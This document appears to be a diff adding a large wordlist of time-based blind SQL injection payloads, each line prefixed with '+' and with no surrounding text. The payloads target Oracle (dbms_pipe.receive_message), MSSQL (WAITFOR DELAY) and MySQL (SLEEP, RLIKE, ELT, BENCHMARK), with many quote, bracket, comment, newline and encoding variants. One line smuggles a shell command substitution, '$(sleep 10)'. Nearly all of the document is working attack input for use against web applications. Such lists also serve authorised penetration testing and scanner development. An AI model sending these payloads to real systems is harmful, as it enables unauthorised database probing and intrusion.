+0x0a\' and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+0x0a\' and 1337=dbms_pipe.receive_message(1,120) -- 
+0x0a\' or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+0x0a\' or 1337=dbms_pipe.receive_message(1,120) -- 
+0x0a\';select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual  -- 
+0x0a\';select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+0x0a\\' and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+0x0a\\' and 1337=dbms_pipe.receive_message(1,120) -- 
+0x0a\\' or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+0x0a\\' or 1337=dbms_pipe.receive_message(1,120) -- 
+0x0a\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),120) else null end from dual  -- 
+0x0a\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+0x0d0a and 1337=dbms_pipe.receive_message(('a'),120)
+0x0d0a and 1337=dbms_pipe.receive_message(('a'),120) -- 
+0x0d0a and 1337=dbms_pipe.receive_message((\'a\'),120)
+0x0d0a and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+0x0d0a and 1337=dbms_pipe.receive_message((\\'a\\'),120)
+0x0d0a and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+0x0d0a and 1337=dbms_pipe.receive_message(1,120)
+0x0d0a and 1337=dbms_pipe.receive_message(1,120) -- 
+0x0d0a or 1337=dbms_pipe.receive_message(('a'),120)
+0x0d0a or 1337=dbms_pipe.receive_message(('a'),120) -- 
+0x0d0a or 1337=dbms_pipe.receive_message((\'a\'),120)
+0x0d0a or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+0x0d0a or 1337=dbms_pipe.receive_message((\\'a\\'),120)
+0x0d0a or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+0x0d0a or 1337=dbms_pipe.receive_message(1,120)
+0x0d0a or 1337=dbms_pipe.receive_message(1,120) -- 
+0x0d0a' and 1337=dbms_pipe.receive_message(('a'),120) -- 
+0x0d0a' and 1337=dbms_pipe.receive_message(1,120) -- 
+0x0d0a' or 1337=dbms_pipe.receive_message(('a'),120) -- 
+0x0d0a' or 1337=dbms_pipe.receive_message(1,120) -- 
+0x0d0a';select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual  -- 
+0x0d0a';select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+0x0d0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual
+0x0d0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual -- 
+0x0d0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual
+0x0d0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+0x0d0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual
+0x0d0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual -- 
+0x0d0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual
+0x0d0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+0x0d0a\' and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+0x0d0a\' and 1337=dbms_pipe.receive_message(1,120) -- 
+0x0d0a\' or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+0x0d0a\' or 1337=dbms_pipe.receive_message(1,120) -- 
+0x0d0a\';select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual  -- 
+0x0d0a\';select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+0x0d0a\\' and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+0x0d0a\\' and 1337=dbms_pipe.receive_message(1,120) -- 
+0x0d0a\\' or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+0x0d0a\\' or 1337=dbms_pipe.receive_message(1,120) -- 
+0x0d0a\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),120) else null end from dual  -- 
+0x0d0a\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual
+;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual -- 
+;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual
+;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual
+;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual -- 
+;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual
+;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+\' and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+\' and 1337=dbms_pipe.receive_message(1,120) -- 
+\' or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+\' or 1337=dbms_pipe.receive_message(1,120) -- 
+\';select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual  -- 
+\';select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+\\' and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+\\' and 1337=dbms_pipe.receive_message(1,120) -- 
+\\' or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+\\' or 1337=dbms_pipe.receive_message(1,120) -- 
+\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),120) else null end from dual  -- 
+\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+\\n and 1337=dbms_pipe.receive_message(('a'),120)
+\\n and 1337=dbms_pipe.receive_message(('a'),120) -- 
+\\n and 1337=dbms_pipe.receive_message((\\'a\\'),120)
+\\n and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+\\n and 1337=dbms_pipe.receive_message(1,120)
+\\n and 1337=dbms_pipe.receive_message(1,120) -- 
+\\n or 1337=dbms_pipe.receive_message(('a'),120)
+\\n or 1337=dbms_pipe.receive_message(('a'),120) -- 
+\\n or 1337=dbms_pipe.receive_message((\\'a\\'),120)
+\\n or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+\\n or 1337=dbms_pipe.receive_message(1,120)
+\\n or 1337=dbms_pipe.receive_message(1,120) -- 
+\\n' and 1337=dbms_pipe.receive_message(('a'),120) -- 
+\\n' and 1337=dbms_pipe.receive_message(1,120) -- 
+\\n' or 1337=dbms_pipe.receive_message(('a'),120) -- 
+\\n' or 1337=dbms_pipe.receive_message(1,120) -- 
+\\n';select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual  -- 
+\\n';select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+\\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual
+\\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual -- 
+\\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual
+\\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+\\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual
+\\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual -- 
+\\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual
+\\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+\\n\\' and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+\\n\\' and 1337=dbms_pipe.receive_message(1,120) -- 
+\\n\\' or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+\\n\\' or 1337=dbms_pipe.receive_message(1,120) -- 
+\\n\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),120) else null end from dual  -- 
+\\n\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+\\r\\n and 1337=dbms_pipe.receive_message(('a'),120)
+\\r\\n and 1337=dbms_pipe.receive_message(('a'),120) -- 
+\\r\\n and 1337=dbms_pipe.receive_message((\\'a\\'),120)
+\\r\\n and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+\\r\\n and 1337=dbms_pipe.receive_message(1,120)
+\\r\\n and 1337=dbms_pipe.receive_message(1,120) -- 
+\\r\\n or 1337=dbms_pipe.receive_message(('a'),120)
+\\r\\n or 1337=dbms_pipe.receive_message(('a'),120) -- 
+\\r\\n or 1337=dbms_pipe.receive_message((\\'a\\'),120)
+\\r\\n or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+\\r\\n or 1337=dbms_pipe.receive_message(1,120)
+\\r\\n or 1337=dbms_pipe.receive_message(1,120) -- 
+\\r\\n' and 1337=dbms_pipe.receive_message(('a'),120) -- 
+\\r\\n' and 1337=dbms_pipe.receive_message(1,120) -- 
+\\r\\n' or 1337=dbms_pipe.receive_message(('a'),120) -- 
+\\r\\n' or 1337=dbms_pipe.receive_message(1,120) -- 
+\\r\\n';select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual  -- 
+\\r\\n';select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+\\r\\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual
+\\r\\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual -- 
+\\r\\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual
+\\r\\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+\\r\\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual
+\\r\\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual -- 
+\\r\\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual
+\\r\\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+\\r\\n\\' and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+\\r\\n\\' and 1337=dbms_pipe.receive_message(1,120) -- 
+\\r\\n\\' or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+\\r\\n\\' or 1337=dbms_pipe.receive_message(1,120) -- 
+\\r\\n\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),120) else null end from dual  -- 
+\\r\\n\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+\n and 1337=dbms_pipe.receive_message(('a'),120)
+\n and 1337=dbms_pipe.receive_message(('a'),120) -- 
+\n and 1337=dbms_pipe.receive_message((\'a\'),120)
+\n and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+\n and 1337=dbms_pipe.receive_message(1,120)
+\n and 1337=dbms_pipe.receive_message(1,120) -- 
+\n or 1337=dbms_pipe.receive_message(('a'),120)
+\n or 1337=dbms_pipe.receive_message(('a'),120) -- 
+\n or 1337=dbms_pipe.receive_message((\'a\'),120)
+\n or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+\n or 1337=dbms_pipe.receive_message(1,120)
+\n or 1337=dbms_pipe.receive_message(1,120) -- 
+\n' and 1337=dbms_pipe.receive_message(('a'),120) -- 
+\n' and 1337=dbms_pipe.receive_message(1,120) -- 
+\n' or 1337=dbms_pipe.receive_message(('a'),120) -- 
+\n' or 1337=dbms_pipe.receive_message(1,120) -- 
+\n';select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual  -- 
+\n';select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual
+\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual -- 
+\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual
+\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual
+\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual -- 
+\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual
+\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+\n\' and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+\n\' and 1337=dbms_pipe.receive_message(1,120) -- 
+\n\' or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+\n\' or 1337=dbms_pipe.receive_message(1,120) -- 
+\n\';select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual  -- 
+\n\';select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+\r\n and 1337=dbms_pipe.receive_message(('a'),120)
+\r\n and 1337=dbms_pipe.receive_message(('a'),120) -- 
+\r\n and 1337=dbms_pipe.receive_message((\'a\'),120)
+\r\n and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+\r\n and 1337=dbms_pipe.receive_message(1,120)
+\r\n and 1337=dbms_pipe.receive_message(1,120) -- 
+\r\n or 1337=dbms_pipe.receive_message(('a'),120)
+\r\n or 1337=dbms_pipe.receive_message(('a'),120) -- 
+\r\n or 1337=dbms_pipe.receive_message((\'a\'),120)
+\r\n or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+\r\n or 1337=dbms_pipe.receive_message(1,120)
+\r\n or 1337=dbms_pipe.receive_message(1,120) -- 
+\r\n' and 1337=dbms_pipe.receive_message(('a'),120) -- 
+\r\n' and 1337=dbms_pipe.receive_message(1,120) -- 
+\r\n' or 1337=dbms_pipe.receive_message(('a'),120) -- 
+\r\n' or 1337=dbms_pipe.receive_message(1,120) -- 
+\r\n';select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual  -- 
+\r\n';select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+\r\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual
+\r\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual -- 
+\r\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual
+\r\n;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+\r\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual
+\r\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual -- 
+\r\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual
+\r\n;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+\r\n\' and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+\r\n\' and 1337=dbms_pipe.receive_message(1,120) -- 
+\r\n\' or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+\r\n\' or 1337=dbms_pipe.receive_message(1,120) -- 
+\r\n\';select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual  -- 
+\r\n\';select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+waitfor delay '0:0:10'--
+;waitfor delay '0:0:10'--
+);waitfor delay '0:0:10'--
+';waitfor delay '0:0:10'--
+";waitfor delay '0:0:10'--
+');waitfor delay '0:0:10'--
+");waitfor delay '0:0:10'--
+));waitfor delay '0:0:10'--
+'));waitfor delay '0:0:10'--
+"));waitfor delay '0:0:10'--
+") IF (1=1) WAITFOR DELAY '0:0:10'--
+';%5waitfor%5delay%5'0:0:10'%5--%5
+' WAITFOR DELAY '0:0:10'--
+' WAITFOR DELAY '0:0:10'
+or WAITFOR DELAY '0:0:10'--
+or WAITFOR DELAY '0:0:10'
+and WAITFOR DELAY '0:0:10'--
+and WAITFOR DELAY '0:0:10'
+WAITFOR DELAY '0:0:10'
+;WAITFOR DELAY '0:0:10'--
+;WAITFOR DELAY '0:0:10'
+1 WAITFOR DELAY '0:0:10'--
+1 WAITFOR DELAY '0:0:10'
+1 WAITFOR DELAY '0:0:10'-- 1337
+1' WAITFOR DELAY '0:0:10' AND '1337'='1337
+1') WAITFOR DELAY '0:0:10' AND ('1337'='1337
+1) WAITFOR DELAY '0:0:10' AND (1337=1337
+' WAITFOR DELAY '0:0:10'--
+" WAITFOR DELAY '0:0:10'--
+')) WAITFOR DELAY '0:0:10'--
+'))) WAITFOR DELAY '0:0:10'--
+%' WAITFOR DELAY '0:0:10'--
+") WAITFOR DELAY '0:0:10'--
+")) WAITFOR DELAY '0:0:10'--
+"))) WAITFOR DELAY '0:0:10'--
+1 waitfor delay '0:0:10'--
+1' waitfor delay '0:0:10'--
+1 and sleep(10)--
+1 and sleep(10)
+1 and sleep(10)--
+1 and sleep(10)
+' and sleep(10)--
+' and sleep(10)
+' and sleep(10) and '1'='1
+' and sleep(10) and '1'='1
+' and sleep(10)--
+' and sleep(10)
+' AnD SLEEP(10) ANd '1
+and sleep(10)--
+and sleep(10)
+and sleep(10)--
+and sleep(10)
+and SELECT SLEEP(10); #
+AnD SLEEP(10)
+AnD SLEEP(10)--
+AnD SLEEP(10)#
+' AND SLEEP(10)#
+" AND SLEEP(10)#
+') AND SLEEP(10)#
+or sleep(10)--
+or sleep(10)
+or sleep(10)--
+or sleep(10)
+or SELECT SLEEP(10); #
+or SLEEP(10)
+or SLEEP(10)#
+or SLEEP(10)--
+or SLEEP(10)="
+or SLEEP(10)='
+' OR SLEEP(10)#
+" OR SLEEP(10)#
+') OR SLEEP(10)#
+')) or sleep(10)='
+" or sleep(10)#
+1) or sleep(10)#
+)) or sleep(10)='
+1)) or sleep(10)#
+or sleep(10)#
+%20'sleep%2010'
+%20$(sleep%2010)
+")) or sleep(10)="
+or sleep(10)='
+") or sleep(10)="
+) or sleep(10)='
+1 OR sleep(10)#1 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND (1337=1337
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND '1337'='1337
+') AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ('PBiy'='PBiy
+) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
+) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND (1337=1337
+)) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ((1337=1337
+))) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND (((1337=1337
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)# 1337
+) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
+1 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
++(SELECT 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY))+
+)) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
+) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
+` WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
+`) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
+`=`1` AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND `1`=`1
+]-(SELECT 0 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY))|[1
+') AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
+" AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
+') AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ('1337'='1337
+')) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND (('1337'='1337
+'))) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ((('1337'='1337
+' AND (SELECT 3122 FROM (SELECT(SLEEP(10)))YYYY) AND '1337'='1337
+') AND (SELECT 4796 FROM (SELECT(SLEEP(10)))YYYY) AND ('1337'='1337
+')) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND (('1337' LIKE '1337
+'))) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ((('1337' LIKE '1337
+%' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND '1337%'='1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND '1337' LIKE '1337
+") AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ("1337"="1337
+")) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND (("1337"="1337
+"))) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ((("1337"="1337
+" AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND "1337"="1337
+") AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ("1337" LIKE "1337
+")) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND (("1337" LIKE "1337
+"))) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ((("1337" LIKE "1337
+" AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND "1337" LIKE "1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) OR '1337'='1337
+') WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
+") WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337RLIKE SLEEP(5)--
+' RLIKE SLEEP(10)--
+' RLIKE SLEEP(10)-- 1337
+" RLIKE SLEEP(10)-- 1337
+') RLIKE SLEEP(10)-- 1337
+') RLIKE SLEEP(10) AND ('1337'='1337
+')) RLIKE SLEEP(10) AND (('1337'='1337
+'))) RLIKE SLEEP(10) AND ((('1337'='1337
+) RLIKE SLEEP(10)-- 1337
+) RLIKE SLEEP(10) AND (1337=1337
+)) RLIKE SLEEP(10) AND ((1337=1337
+))) RLIKE SLEEP(10) AND (((1337=1337
+1 RLIKE SLEEP(10)
+1 RLIKE SLEEP(10)-- 1337
+1 RLIKE SLEEP(10)# 1337
+1 WHERE 1337=1337 RLIKE SLEEP(10)-- 1337
++(SELECT 1337 WHERE 1337=1337 RLIKE SLEEP(10))+
+)) AS 1337 WHERE 1337=1337 RLIKE SLEEP(10)-- 1337
+) AS 1337 WHERE 1337=1337 RLIKE SLEEP(10)-- 1337
+` WHERE 1337=1337 RLIKE SLEEP(10)-- 1337
+`) WHERE 1337=1337 RLIKE SLEEP(10)-- 1337
+' RLIKE SLEEP(10) AND '1337'='1337
+') RLIKE SLEEP(10) AND ('1337' LIKE '1337
+')) RLIKE SLEEP(10) AND (('1337' LIKE '1337
+'))) RLIKE SLEEP(10) AND ((('1337' LIKE '1337
+%' RLIKE SLEEP(10) AND '1337%'='1337
+' RLIKE SLEEP(10) AND '1337' LIKE '1337
+") RLIKE SLEEP(10) AND ("1337"="1337
+")) RLIKE SLEEP(10) AND (("1337"="1337
+"))) RLIKE SLEEP(10) AND ((("1337"="1337
+" RLIKE SLEEP(10) AND "1337"="1337
+") RLIKE SLEEP(10) AND ("1337" LIKE "1337
+")) RLIKE SLEEP(10) AND (("1337" LIKE "1337
+"))) RLIKE SLEEP(10) AND ((("1337" LIKE "1337
+" RLIKE SLEEP(10) AND "1337" LIKE "1337
+' RLIKE SLEEP(10) OR '1337'='1337
+') WHERE 1337=1337 RLIKE SLEEP(10)-- 1337
+") WHERE 1337=1337 RLIKE SLEEP(10)-- 1337
+' WHERE 1337=1337 RLIKE SLEEP(10)-- 1337
+" WHERE 1337=1337 RLIKE SLEEP(10)-- 1337
+' AND ELT(1337=1337,SLEEP(10))--
+' AND ELT(1337=1337,SLEEP(10))-- 1337
+" AND ELT(1337=1337,SLEEP(10))-- 1337
+') AND ELT(1337=1337,SLEEP(10))-- 1337
+') AND ELT(1337=1337,SLEEP(10)) AND ('1337'='1337
+')) AND ELT(1337=1337,SLEEP(10)) AND (('1337'='1337
+'))) AND ELT(1337=1337,SLEEP(10)) AND ((('1337'='1337
+' AND ELT(1337=1337,SLEEP(10)) AND '1337'='1337
+') AND ELT(1337=1337,SLEEP(10)) AND ('1337' LIKE '1337
+')) AND ELT(1337=1337,SLEEP(10)) AND (('1337' LIKE '1337
+'))) AND ELT(1337=1337,SLEEP(10)) AND ((('1337' LIKE '1337
+) AND ELT(1337=1337,SLEEP(10))-- 1337
+) AND ELT(1337=1337,SLEEP(10)) AND (1337=1337
+)) AND ELT(1337=1337,SLEEP(10)) AND ((1337=1337
+))) AND ELT(1337=1337,SLEEP(10)) AND (((1337=1337
+1 AND ELT(1337=1337,SLEEP(10))
+1 AND ELT(1337=1337,SLEEP(10))-- 1337
+1 AND ELT(1337=1337,SLEEP(10))# 1337
+) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
+1 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
++(SELECT 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10)))+
+)) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
+) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
+` WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
+`) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
+1`=`1` AND ELT(1337=1337,SLEEP(10)) AND `1`=`1
+]-(SELECT 0 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10)))|[1
+%' AND ELT(1337=1337,SLEEP(10)) AND '1337%'='1337
+' AND ELT(1337=1337,SLEEP(10)) AND '1337' LIKE '1337
+") AND ELT(1337=1337,SLEEP(10)) AND ("1337"="1337
+")) AND ELT(1337=1337,SLEEP(10)) AND (("1337"="1337
+"))) AND ELT(1337=1337,SLEEP(10)) AND ((("1337"="1337
+" AND ELT(1337=1337,SLEEP(10)) AND "1337"="1337
+") AND ELT(1337=1337,SLEEP(10)) AND ("1337" LIKE "1337
+")) AND ELT(1337=1337,SLEEP(10)) AND (("1337" LIKE "1337
+"))) AND ELT(1337=1337,SLEEP(10)) AND ((("1337" LIKE "1337
+" AND ELT(1337=1337,SLEEP(10)) AND "1337" LIKE "1337
+' AND ELT(1337=1337,SLEEP(10)) OR '1337'='FMTE
+') WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
+") WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
+' WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
+" WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
+'||(SELECT 0x727a5277 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10)))||'
+'+(SELECT 0x4b6b486c WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10)))+'
+||(SELECT 0x57556971 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10)))||
+||(SELECT 0x67664847 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10)))||
++(SELECT 0x74764164 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10)))+
+')) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
+")) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
+') AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
+") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))--
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+" AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+') AND =BENCHMARK(5000000,MD5(0x774c5341))--
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337'='1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337'='1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337'='1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337' LIKE '1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337' LIKE '1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337' LIKE '1337
+%' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337%'='1337
